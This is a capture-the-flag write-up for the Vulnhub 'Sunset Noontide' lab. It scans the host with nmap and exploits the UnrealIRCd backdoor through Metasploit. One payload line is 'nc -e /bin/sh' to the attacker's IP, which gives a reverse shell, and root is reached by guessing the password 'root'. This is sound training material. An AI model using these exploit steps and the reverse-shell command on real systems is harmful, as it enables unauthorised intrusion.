# Sunset-Noontide-Vulnhub-Writeup


### Scanning

nmap  192.168.122.170

![Sunset%20Noontide%20e8e60a81a2b44c76ae3c0e157ea3f832/Untitled.png](Sunset%20Noontide%20e8e60a81a2b44c76ae3c0e157ea3f832/Untitled.png)

nmap -p- 192.168.122.170

![Sunset%20Noontide%20e8e60a81a2b44c76ae3c0e157ea3f832/Untitled%201.png](Sunset%20Noontide%20e8e60a81a2b44c76ae3c0e157ea3f832/Untitled%201.png)

nmap -sV -A 192.168.122.170

![Sunset%20Noontide%20e8e60a81a2b44c76ae3c0e157ea3f832/Untitled%202.png](Sunset%20Noontide%20e8e60a81a2b44c76ae3c0e157ea3f832/Untitled%202.png)

![Sunset%20Noontide%20e8e60a81a2b44c76ae3c0e157ea3f832/Untitled%203.png](Sunset%20Noontide%20e8e60a81a2b44c76ae3c0e157ea3f832/Untitled%203.png)

nmap --script irc-unrealirc-backdoor.nse 192.168.122.170 -p 6667

![Sunset%20Noontide%20e8e60a81a2b44c76ae3c0e157ea3f832/Untitled%204.png](Sunset%20Noontide%20e8e60a81a2b44c76ae3c0e157ea3f832/Untitled%204.png)

### Enumeration

Searching for unrealirc exploit in msfconsole

![Sunset%20Noontide%20e8e60a81a2b44c76ae3c0e157ea3f832/Untitled%205.png](Sunset%20Noontide%20e8e60a81a2b44c76ae3c0e157ea3f832/Untitled%205.png)

use exploit/unix/irc/unreal_ircd_3281_backdoor

![Sunset%20Noontide%20e8e60a81a2b44c76ae3c0e157ea3f832/Untitled%206.png](Sunset%20Noontide%20e8e60a81a2b44c76ae3c0e157ea3f832/Untitled%206.png)

set rhosts 192.168.122.170

![Sunset%20Noontide%20e8e60a81a2b44c76ae3c0e157ea3f832/Untitled%207.png](Sunset%20Noontide%20e8e60a81a2b44c76ae3c0e157ea3f832/Untitled%207.png)

set payload cmd/unix/reverse

![Sunset%20Noontide%20e8e60a81a2b44c76ae3c0e157ea3f832/Untitled%208.png](Sunset%20Noontide%20e8e60a81a2b44c76ae3c0e157ea3f832/Untitled%208.png)

set lhost 192.168.122.178

run

![Sunset%20Noontide%20e8e60a81a2b44c76ae3c0e157ea3f832/Untitled%209.png](Sunset%20Noontide%20e8e60a81a2b44c76ae3c0e157ea3f832/Untitled%209.png)

This payload doesn't work. So using another payload 

set payload cmd/unix/generic

show options

![Sunset%20Noontide%20e8e60a81a2b44c76ae3c0e157ea3f832/Untitled%2010.png](Sunset%20Noontide%20e8e60a81a2b44c76ae3c0e157ea3f832/Untitled%2010.png)

set cmd "nc -e /bin/sh 192.168.122.178 4444"

![Sunset%20Noontide%20e8e60a81a2b44c76ae3c0e157ea3f832/Untitled%2011.png](Sunset%20Noontide%20e8e60a81a2b44c76ae3c0e157ea3f832/Untitled%2011.png)

Start listening on port 4444

nc -lvp 4444

![Sunset%20Noontide%20e8e60a81a2b44c76ae3c0e157ea3f832/Untitled%2012.png](Sunset%20Noontide%20e8e60a81a2b44c76ae3c0e157ea3f832/Untitled%2012.png)

exploit

![Sunset%20Noontide%20e8e60a81a2b44c76ae3c0e157ea3f832/Untitled%2013.png](Sunset%20Noontide%20e8e60a81a2b44c76ae3c0e157ea3f832/Untitled%2013.png)

![Sunset%20Noontide%20e8e60a81a2b44c76ae3c0e157ea3f832/Untitled%2014.png](Sunset%20Noontide%20e8e60a81a2b44c76ae3c0e157ea3f832/Untitled%2014.png)

*****Successfully got reverse shell.

![Sunset%20Noontide%20e8e60a81a2b44c76ae3c0e157ea3f832/Untitled%2015.png](Sunset%20Noontide%20e8e60a81a2b44c76ae3c0e157ea3f832/Untitled%2015.png)

![Sunset%20Noontide%20e8e60a81a2b44c76ae3c0e157ea3f832/Untitled%2016.png](Sunset%20Noontide%20e8e60a81a2b44c76ae3c0e157ea3f832/Untitled%2016.png)

cat local.txt (User Flag)

![Sunset%20Noontide%20e8e60a81a2b44c76ae3c0e157ea3f832/Untitled%2017.png](Sunset%20Noontide%20e8e60a81a2b44c76ae3c0e157ea3f832/Untitled%2017.png)

### Privilege Escalation

In the CTF description it was written "Very easy, do not overthink it!" 

So we'll try password root for user root

su root

password: root

We got shell for root user.

![Sunset%20Noontide%20e8e60a81a2b44c76ae3c0e157ea3f832/Untitled%2018.png](Sunset%20Noontide%20e8e60a81a2b44c76ae3c0e157ea3f832/Untitled%2018.png)

![Sunset%20Noontide%20e8e60a81a2b44c76ae3c0e157ea3f832/Untitled%2019.png](Sunset%20Noontide%20e8e60a81a2b44c76ae3c0e157ea3f832/Untitled%2019.png)

cat proof.txt

![Sunset%20Noontide%20e8e60a81a2b44c76ae3c0e157ea3f832/Untitled%2020.png](Sunset%20Noontide%20e8e60a81a2b44c76ae3c0e157ea3f832/Untitled%2020.png)
